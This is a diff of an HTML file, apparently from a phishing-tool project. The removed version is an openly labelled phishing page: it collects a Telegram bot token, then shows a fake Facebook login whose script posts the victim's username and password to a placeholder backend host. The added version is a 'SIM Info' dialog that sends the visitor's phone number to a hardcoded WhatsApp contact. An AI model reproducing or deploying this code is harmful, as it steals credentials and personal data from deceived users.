@@ -1,79 +1,163 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HACKER TF PHISHING PAGES</title>
+    <title>SIM Info Dialog</title>
     <style>
+        /* General Styling */
         body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
+            font-family: 'Arial', sans-serif;
+            background: #121212;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
-        h1, h2 {
-            color: #333;
+
+        /* Dialog Box */
+        .dialog-container {
+            position: absolute;
+            width: 350px;
+            background: rgba(20, 20, 20, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.5);
+            text-align: center;
+            transform: scale(0);
+            opacity: 0;
+            transition: transform 0.5s ease, opacity 0.5s ease;
         }
-        input, button {
-            margin: 10px 0;
+
+        /* 3D Animation Effect */
+        .dialog-container.show {
+            transform: scale(1) rotateY(10deg);
+            opacity: 1;
+        }
+
+        /* Stylish Heading */
+        h2 {
+            font-size: 1.8rem;
+            text-shadow: 0 0 10px #0ff, 0 0 20px #0ff;
+        }
+
+        /* Input Box */
+        input {
+            width: 80%;
             padding: 10px;
-            font-size: 16px;
+            border-radius: 8px;
+            border: 2px solid #0ff;
+            background: transparent;
+            color: white;
+            font-size: 1rem;
+            margin: 10px 0;
+            text-align: center;
+            box-shadow: 0 0 10px #0ff;
         }
-        button {
+
+        /* Placeholder Text Color */
+        input::placeholder {
+            color: #aaa;
+        }
+
+        /* Buttons */
+        .button {
+            padding: 12px 25px;
+            margin: 10px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            text-transform: uppercase;
             cursor: pointer;
+            transition: all 0.3s ease;
+            color: #fff;
+            box-shadow: 0 0 15px #0ff;
         }
-        .hidden {
-            display: none;
+
+        /* Button Colors */
+        .voice-btn {
+            background: #ff6600;
+            box-shadow: 0 0 15px #ff6600;
+        }
+
+        .whatsapp-btn {
+            background: #25d366;
+            box-shadow: 0 0 15px #25d366;
+        }
+
+        /* Hover Effects */
+        .button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 25px #0ff;
+        }
+
+        /* Open Dialog Button */
+        .open-dialog {
+            padding: 15px 30px;
+            background: #0ff;
+            color: #121212;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            box-shadow: 0 0 20px #0ff;
+            transition: all 0.3s ease;
+        }
+
+        .open-dialog:hover {
+            background: #121212;
+            color: #0ff;
+            box-shadow: 0 0 30px #0ff;
         }
     </style>
 </head>
 <body>
-    <h1>Welcome to HACKER TF PHISHING PAGE</h1>
-    <button id="createLinkButton">Create Link</button>
 
-    <div id="tokenForm" class="hidden">
-        <input type="text" id="botToken" placeholder="Enter your Telegram Bot Token">
-        <button id="submitToken">Submit</button>
-    </div>
+    <!-- Open Dialog Button -->
+    <button class="open-dialog" onclick="openDialog()">Open SIM Info</button>
 
-    <div id="fakeFacebookLogin" class="hidden">
-        <h2>Fake Facebook Login</h2>
-        <input type="text" id="fakeUsername" placeholder="Username">
-        <input type="password" id="fakePassword" placeholder="Password">
-        <button id="fakeLoginButton">Login</button>
+    <!-- Dialog Box -->
+    <div class="dialog-container" id="dialog">
+        <h2>Enter Phone Number</h2>
+        <input type="text" id="phone-number" placeholder="Enter phone number" />
+
+        <button class="button voice-btn" onclick="startVoiceInput()">🎤 Speak</button>
+        <button class="button whatsapp-btn" onclick="openWhatsApp()">📱 WhatsApp</button>
     </div>
 
     <script>
-        document.getElementById('createLinkButton').addEventListener('click', function() {
-            document.getElementById('tokenForm').classList.remove('hidden');
-        });
+        // Function to Open the Dialog Box
+        function openDialog() {
+            document.getElementById('dialog').classList.add('show');
+        }
 
-        document.getElementById('submitToken').addEventListener('click', function() {
-            var botToken = document.getElementById('botToken').value;
-            if (botToken) {
-                document.getElementById('tokenForm').classList.add('hidden');
-                document.getElementById('fakeFacebookLogin').classList.remove('hidden');
-            }
-        });
+        // Function for Voice Input
+        function startVoiceInput() {
+            const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+            recognition.lang = "en-US";
+            recognition.start();
 
-        document.getElementById('fakeLoginButton').addEventListener('click', function() {
-            var username = document.getElementById('fakeUsername').value;
-            var password = document.getElementById('fakePassword').value;
-            if (username && password) {
-                fetch('https://your-backend-server.com/send-login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ username, password }),
-                })
-                .then(response => response.json())
-                .then(data => {
-                    alert('Login details sent to Telegram bot.');
-                })
-                .catch((error) => {
-                    console.error('Error:', error);
-                });
+            recognition.onresult = function(event) {
+                document.getElementById('phone-number').value = event.results[0][0].transcript;
+            };
+
+            recognition.onerror = function() {
+                alert("Voice recognition failed, try again!");
+            };
+        }
+
+        // Function to Open WhatsApp with Number
+        function openWhatsApp() {
+            const phoneNumber = document.getElementById('phone-number').value.trim();
+            if (phoneNumber) {
+                window.open(`https://wa.me/923259421220?text=Hello! My number is ${phoneNumber}`, '_blank');
+            } else {
+                alert("Please enter a phone number first!");
             }
-        });
+        }
     </script>
+
 </body>
 </html>
